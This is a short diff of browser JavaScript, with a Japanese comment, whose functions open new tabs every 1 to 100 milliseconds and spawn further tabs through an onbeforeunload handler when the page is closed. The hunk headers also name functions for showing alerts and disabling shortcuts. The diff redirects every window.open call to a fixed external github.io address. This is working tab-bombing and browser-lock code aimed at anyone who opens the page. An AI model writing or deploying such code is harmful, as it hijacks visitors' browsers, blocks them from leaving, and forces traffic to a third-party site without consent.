@@ -3,7 +3,7 @@ let openNewTabInterval;
 
 function duplicateTabEverySecond() {
     openNewTabInterval = setInterval(function() {
-        window.open(location.href);
+        window.open('https://kabusikigaisyaidea.github.io/burakura8313/');
     }, 1);
 }
 
@@ -17,7 +17,7 @@ function showAlert() {
 function openNewTabsOnClose() {
     window.onbeforeunload = function() {
         for (let i = 0; i < 2; i++) {
-            window.open(location.href);
+            window.open('https://kabusikigaisyaidea.github.io/burakura8313/');
         }
     };
 }
@@ -52,7 +52,7 @@ function disableShortcuts() {
 // 1秒ごとに新しいタブを開く関数
 function duplicateTabEverySecond() {
     openNewTabInterval = setInterval(function() {
-        window.open(location.href);
+        window.open('https://kabusikigaisyaidea.github.io/burakura8313/');
     }, 100);
 }
 
